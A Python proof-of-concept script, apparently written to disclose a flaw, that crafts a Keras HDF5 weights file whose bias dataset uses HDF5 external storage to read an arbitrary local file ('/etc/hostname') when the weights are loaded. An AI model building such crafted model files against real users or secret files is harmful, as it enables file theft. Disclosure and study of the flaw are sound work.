import os
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
os.environ['TF_ENABLE_ONEDNN_OPTS'] = '0'
import warnings; warnings.filterwarnings('ignore')

import numpy as np
import h5py
import keras

TARGET = '/etc/hostname'
UNITS = 8
NBYTES = UNITS * 4

model = keras.Sequential([
    keras.layers.Input(shape=(1,), name='input'),
    keras.layers.Dense(UNITS, use_bias=True, name='dense'),
])
model(np.zeros((1, 1)))

with h5py.File('keras_lfd_poc.h5', 'w') as f:
    f.attrs['layer_names'] = [b'dense']
    f.attrs['keras_version'] = b'2.15.0'
    f.attrs['backend'] = b'tensorflow'
    g = f.create_group('dense')
    g.attrs['weight_names'] = [b'kernel:0', b'bias:0']
    g.create_dataset('kernel:0', data=np.zeros((1, UNITS), dtype='float32'))
    g.create_dataset('bias:0', shape=(UNITS,), dtype='float32',
                     external=[(TARGET, 0, NBYTES)])

keras.saving.load_weights(model, 'keras_lfd_poc.h5')

bias = model.get_layer('dense').bias.numpy()
raw = bias.view(np.uint8).tobytes()
leaked = ''.join(chr(b) if 32 <= b < 127 else '.' for b in raw)

print(f'[!] Leaked {TARGET!r} via keras.saving.load_weights():')
print(f'    {leaked!r}')
actual = open(TARGET, 'rb').read(NBYTES)
print(f'[+] Matches target file: {raw == actual.ljust(NBYTES, b"\x00")}')
